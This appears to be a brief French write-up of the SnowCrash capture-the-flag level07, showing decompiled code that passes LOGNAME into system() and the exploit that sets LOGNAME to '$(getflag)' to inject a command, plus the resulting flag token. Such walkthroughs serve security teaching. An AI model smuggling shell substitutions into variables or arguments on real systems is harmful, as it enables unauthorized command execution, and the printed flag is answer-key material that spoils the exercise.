@@ -1,0 +1,17 @@
+On choppe le fichier level07 avec scp pour le décompiler avec IDA Pro,
+
+Dans le main on voit : 
+
+  v3 = getenv("LOGNAME");
+  asprintf(&v5, "/bin/echo %s ", v3);
+  return system(v5);
+
+
+  On sait que par exemple : 
+  /bin/echo $(ls)
+
+  Permet de grosso run ls avec echo, on a juste a faire pareil ... mais pour getflag
+
+	level07@SnowCrash:~$ export LOGNAME=$\(getflag\)
+	level07@SnowCrash:~$ ./level07
+	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
